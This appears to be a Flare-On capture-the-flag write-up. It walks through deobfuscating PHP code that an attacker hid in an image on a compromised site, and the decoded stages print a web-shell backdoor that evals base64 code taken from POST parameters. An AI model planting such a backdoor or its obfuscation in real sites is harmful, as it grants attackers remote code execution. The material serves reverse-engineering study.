In this one, flare-on.com site was attacked. The attacker left “something” behind for us to investigate. We are getting the snapshot of the site for analysis and the email is somewhere inside:

![](/images/flare_ch2_files.png)

After analysis of the original site against the challenge files, the “secret” is found in the image file (flare-on.png) and that is where the “digging” will take place:

![](/images/flare_ch2_data.png)

Let’s extract that hidden message for further processing - Stage 0:

  for($i=0;$i<count($order);$i++){$do_me=$do_me.$terms[$order[$i]];}
  eval($do_me); ?>}
```

Clearly, something will be evaluated `eval($do_me);` and I start from calculating `$do_me` variable by using some online php evaluator - Stage 1:

```php
$_= \'aWYoaXNzZXQoJF9QT1NUWyJcOTdcNDlcNDlcNjhceDRGXDg0XDExNlx4NjhcOTdceDc0XHg0NFx4NEZceDU0XHg2QVw5N1x4NzZceDYxXHgzNVx4NjNceDcyXDk3XHg3MFx4NDFcODRceDY2XHg2Q1w5N1x4NzJceDY1XHg0NFw2NVx4NTNcNzJcMTExXDExMFw2OFw3OVw4NFw5OVx4NkZceDZEIl0pKSB7IGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbIlw5N1w0OVx4MzFcNjhceDRGXHg1NFwxMTZcMTA0XHg2MVwxMTZceDQ0XDc5XHg1NFwxMDZcOTdcMTE4XDk3XDUzXHg2M1wxMTRceDYxXHg3MFw2NVw4NFwxMDJceDZDXHg2MVwxMTRcMTAxXHg0NFw2NVx4NTNcNzJcMTExXHg2RVx4NDRceDRGXDg0XDk5XHg2Rlx4NkQiXSkpOyB9\';
$__=\'JGNvZGU9YmFzZTY0X2RlY29kZSgkXyk7ZXZhbCgkY29kZSk7\';
$___="\x62\141\x73\145\x36\64\x5f\144\x65\143\x6f\144\x65";
eval($___($__));
```

There are 3 variables holding the code in various encodings/obfucations:

- base64 encoding – `$S_`, `$__`
- hex char representation – `$___`

Let’s remove the obfuscation to see the clear picture - Stage 2:

```php
$_='if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) {
eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"])); }';

$__='$code=base64_decode($_);eval($code);';

$___="base64_decode";

eval($___($__));
```

Now it’s clear what is going on and effectively the above means that the following code will be executed:

```
$code = "
 if(isset($_POST["\97\49\49\68\x4F\84\116\x68\97\x74\x44\x4F\x54\x6A\97\x76\x61\x35\x63\x72\97\x70\x41\84\x66\x6C\97\x72\x65\x44\65\x53\72\111\110\68\79\84\99\x6F\x6D"])) 
 { 
     eval(base64_decode($_POST["\97\49\x31\68\x4F\x54\116\104\x61\116\x44\79\x54\106\97\118\97\53\x63\114\x61\x70\65\84\102\x6C\x61\114\101\x44\65\x53\72\111\x6E\x44\x4F\84\99\x6F\x6D"])); 
 }
 "
eval($code);
```

Those `$_POST`s inclose “obfuscated” strings which are represented by ascii numerical values of characters and both by the way are the same. In several simple steps we get the encoded message which is the email address and again I’ll leave for you to discover the full one:
